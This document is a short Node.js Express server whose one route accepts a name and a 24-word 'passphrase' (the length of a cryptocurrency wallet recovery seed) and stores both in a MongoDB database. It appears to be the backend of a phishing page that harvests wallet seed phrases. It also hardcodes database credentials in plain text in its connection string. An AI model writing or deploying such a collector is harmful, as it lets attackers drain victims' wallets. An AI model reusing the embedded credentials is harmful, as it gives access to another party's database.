const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');

const app = express();
const port = process.env.PORT || 3000;

// Use body-parser to parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Connect to MongoDB (update with your actual connection string)
mongoose.connect(process.env.MONGODB_URI || 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

// Define a schema for the passphrase data
const passphraseSchema = new mongoose.Schema({
  name: String,
  passphrase: String,
});

const Passphrase = mongoose.model('Passphrase', passphraseSchema);

// Handle POST request to /submit route
app.post('/submit', (req, res) => {
  const { name, passphrase } = req.body;

  // Basic validation
  if (!name || !passphrase || passphrase.split(' ').length !== 24) {
    return res.status(400).send('Please enter a valid 24-word passphrase.');
  }

  // Create a new passphrase entry
  const newPassphrase = new Passphrase({ name, passphrase });

  // Save to the database
  newPassphrase.save((err) => {
    if (err) {
      return res.status(500).send('Failed to store passphrase.');
    }
    res.send('Passphrase saved successfully!');
  });
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

